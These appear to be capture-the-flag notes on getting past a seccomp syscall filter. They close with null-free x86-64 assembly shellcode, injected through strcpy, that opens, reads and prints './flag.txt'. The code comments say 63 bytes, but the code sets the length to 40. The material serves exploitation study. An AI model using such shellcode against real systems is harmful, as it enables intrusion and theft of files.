### Main Idea: Linux Kernel SECCOMP
- Limits system calls that can be made on a system
- https://www.kernel.org/doc/html/v4.16/userspace-api/seccomp_filter.html
- seccomp-tools: https://github.com/david942j/seccomp-tools
	- useful for analyzing seccomp on a system

### Code Analysis
- mprotect - sets the permissions for the process's memory pages
- prctl - "manipulates various aspects of the behavior of the calling thread or process"
- strcpy - this is how we will be supplying malicious input
	- strcpy stops on nullbytes
	- no nullbytes!!

shellcode! only with read, write, and open!
```
/*save addr of buffer into register not used much*/
mov r14, rax
xor rax, rax

/* open("./flag.txt", flags) */
mov r11, 0x1111111111117478
shl r11, 0x30
shr r11, 0x30
push r11
xor r11, r11
mov rax, 0x742e67616c662f2e
push rax
mov rdi, rsp
xor esi, esi
xor edx, edx
xor eax, eax
inc eax
inc eax
syscall

/*store flag.txt fd*/
mov r15, rax
xor rax, rax

/*read(fd, buffer, 63)*/
mov rdi, r15
mov rsi, r14
mov rdx, 0x1111111111111128
shl rdx, 0x38
shr rdx, 0x38
xor eax, eax
syscall

/*write(1, buffer, 63)*/
xor rdi, rdi
inc rdi
mov rsi, r14
mov rdx, 0x1111111111111128
shl rdx, 0x38
shr rdx, 0x38
xor eax, eax
inc eax
syscall
```